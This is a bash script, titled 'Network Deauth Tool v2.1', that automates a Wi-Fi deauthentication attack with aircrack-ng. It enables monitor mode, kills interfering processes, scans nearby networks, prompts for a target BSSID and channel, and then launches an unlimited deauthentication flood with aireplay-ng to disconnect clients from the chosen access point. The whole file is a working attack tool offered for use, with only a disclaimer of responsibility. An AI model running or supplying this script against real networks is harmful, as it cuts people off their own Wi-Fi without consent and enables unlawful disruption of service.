#!/bin/bash
#install aircrack-ng
sudo apt-get install aircrack-ng
sudo apt update -y 
#colors 
GREEN="\e[32m"
RED="\e[31m"
PURPLE="\e[35m"
CYAN="\e[36m"
YELLOW="\e[33m"
BLUE="\e[34m"
Reset="\e[97m"
BOLD="\e[1m"
clear 
echo -e "${RED}${BOLD}"
echo "  ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗"
echo "  ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║"
echo "  ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║"
echo "  ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║"
echo "  ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║"
echo "  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝"
echo -e "${YELLOW}${BOLD}"
echo "  ╔══════════════════════════════════════════════════╗"
echo "  ║            Network Deauth Tool v2.1              ║"
echo "  ╚══════════════════════════════════════════════════╝"
echo -e "${Reset}"
echo "Hi ,this script is an automation tool to perform a deauthentication attack"
echo "on a nearby Wi-Fi network using aircrack-ng. "
echo "The hole script depends on the aircrack-ng suite.
     <all credits goes to the Aircrack-ng dev team.>"
echo -e "${RED}${BOLD}⚠️  Disclaimer: ${Reset} I am not responsible for any misuse of this tool. "
echo -e "${Reset}                                                            by${BOLD}${GREEN} RAEF"
 echo -e "${PURPLE}${BOLD}"
 echo  "╔═══════════════════════════════════════════════════════╗"
 echo  "║                  INITIALIZATION                       ║"
 echo  "╚═══════════════════════════════════════════════════════╝"
echo -e "${GREEN}${BOLD}"
read -p "🚀 Press Enter to continue..."
 ifconfig 
 echo -e "${CYAN}${BOLD}"
 read -p "🔧 Enter u're Net Card's name : "  card
 echo -e "${Reset}"
 sudo airmon-ng start $card
 sudo airmon-ng check kill 
 echo "Scanning Networks .... " 
 sudo timeout 10s airodump-ng $card
 echo -e "${PURPLE}${BOLD}"
 echo  "╔═══════════════════════════════════════════════════════╗"
 echo  "║                   TARGET SELECTION                   ║"
 echo  "╚═══════════════════════════════════════════════════════╝"
 echo -e "${YELLOW}${BOLD}"
 read -p "🎯 Enter Target BSSID:" bssid 
 read -p "📡 Enter Target Channel:" channel
 echo -e "${GREEN}"
 sudo iwconfig $card channel $channel  
 echo -e "${RED}${BOLD}"
 echo "💥 Starting the deauth attack on BSSID '$bssid' on channel '$channel' .. "
 echo "                  Press (Ctrl+C) to stop                          "
 echo -e "${GREEN}"
 sudo aireplay-ng --deauth 0 -a $bssid $card
